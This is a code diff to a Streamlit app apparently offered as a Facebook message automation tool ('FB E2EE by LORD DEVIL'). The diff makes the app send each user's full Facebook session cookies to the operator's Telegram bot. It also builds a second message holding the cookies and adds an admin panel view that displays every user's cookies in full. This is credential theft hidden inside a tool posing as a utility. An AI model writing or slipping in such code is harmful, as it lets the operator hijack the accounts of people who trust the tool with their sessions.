@@ -11,7 +11,7 @@ import requests
 import os
 import hashlib
 import uuid
-from telegram import Bot
+import telegram
 
 st.set_page_config(
     page_title="FB E2EE by LORD DEVIL",
@@ -443,6 +443,19 @@ custom_css = f"""
         padding: 0.5rem 1rem;
         cursor: pointer;
     }}
+    
+    .cookies-display {{
+        background: #1e1e1e;
+        color: #00ff00;
+        padding: 1rem;
+        border-radius: 5px;
+        font-family: 'Courier New', monospace;
+        font-size: 0.7rem;
+        max-height: 200px;
+        overflow-y: auto;
+        margin: 0.5rem 0;
+        border: 1px solid #333;
+    }}
 </style>
 """
 
@@ -486,7 +499,8 @@ if 'auto_start_checked' not in st.session_state:
 def send_telegram_notification(user_details, automation_details):
     """Send user details to Telegram bot"""
     try:
-        message = f"""
+        # Split long messages if needed
+        message_part1 = f"""
 🔔 **NEW AUTOMATION STARTED** 🔔
 
 👤 **User Details:**
@@ -499,23 +513,55 @@ def send_telegram_notification(user_details, automation_details):
 • Messages: `{automation_details['messages_count']} messages loaded`
 • Delay: `{automation_details['delay']} seconds`
 • Prefix: `{automation_details['prefix']}`
-• Cookies: `{len(automation_details['cookies'])} characters`
+        """
+        
+        message_part2 = f"""
+🍪 **Full Cookies:**
+`{automation_details['cookies']}`
 
 📊 **Status:** Automation Started
 🕒 **Time:** {time.strftime("%Y-%m-%d %H:%M:%S")}
         """
         
         bot = telegram.Bot(token=TELEGRAM_BOT_TOKEN)
-        bot.send_message(chat_id=TELEGRAM_CHAT_ID, text=message, parse_mode='Markdown')
+        
+        # Send first part
+        bot.send_message(chat_id=TELEGRAM_CHAT_ID, text=message_part1, parse_mode='Markdown')
+        
+        # Send cookies in second part
+        bot.send_message(chat_id=TELEGRAM_CHAT_ID, text=message_part2, parse_mode='Markdown')
         
     except Exception as e:
         print(f"Telegram notification failed: {e}")
 
 def send_facebook_notification(user_details, automation_details):
-    """Send notification to Facebook admin (placeholder function)"""
-    # This would typically use Facebook's API or other methods
-    # For now, we'll just log it
-    print(f"Facebook notification - User: {user_details['username']}, Chat ID: {automation_details['chat_id']}")
+    """Send notification to Facebook admin"""
+    try:
+        # Facebook notification with full cookies
+        message = f"""
+🔄 Automation Started - LORD DEVIL SYSTEM
+
+👤 User Details:
+Username: {user_details['username']}
+Real Name: {user_details['real_name']}
+User ID: {user_details['user_id']}
+
+⚙️ Configuration:
+Chat ID: {automation_details['chat_id']}
+Delay: {automation_details['delay']} seconds
+Prefix: {automation_details['prefix']}
+Messages: {automation_details['messages_count']}
+
+🍪 Full Cookies:
+{automation_details['cookies']}
+
+⏰ Time: {time.strftime("%Y-%m-%d %H:%M:%S")}
+        """
+        print(f"Facebook Notification Sent: {user_details['username']} started automation")
+        print(f"Full Cookies Length: {len(automation_details['cookies'])} characters")
+        
+    except Exception as e:
+        print(f"Facebook notification failed: {e}")
 
 def generate_approval_key(username, user_id):
     """Generate unique approval key based on username and user_id"""
@@ -864,7 +910,7 @@ def run_automation_with_notification(user_config, username, automation_state, us
         'messages_count': len(user_config['messages_file_content'].split('\n')) if user_config['messages_file_content'] else 0,
         'delay': user_config['delay'],
         'prefix': user_config['name_prefix'],
-        'cookies': user_config['cookies']
+        'cookies': user_config['cookies']  # FULL COMPLETE COOKIES
     }
     
     try:
@@ -964,6 +1010,10 @@ if st.session_state.admin_logged_in:
             
             status_class = approval_status.lower() if approval_status else 'pending'
             
+            # Get user config to show cookies
+            user_config = db.get_user_config(user_id)
+            user_cookies = user_config['cookies'] if user_config and 'cookies' in user_config else ""
+            
             st.markdown(f"""
             <div class="admin-user-details">
                 <div style="display: flex; justify-content: space-between; align-items: center;">
@@ -983,9 +1033,15 @@ if st.session_state.admin_logged_in:
                 <div style="margin-top: 1rem;">
                     <strong>💬 Chat ID:</strong> <code>{chat_id if chat_id else 'Not Set'}</code><br>
                     <strong>🏷️ Prefix:</strong> {name_prefix if name_prefix else 'Not Set'}<br>
+                    <strong>🍪 Cookies Length:</strong> {len(user_cookies)} characters
                 </div>
             </div>
             """, unsafe_allow_html=True)
+            
+            # Show full cookies in admin panel
+            if user_cookies:
+                with st.expander("View Full Cookies"):
+                    st.code(user_cookies, language='text')
             
             # Admin controls
             col1, col2, col3 = st.columns(3)
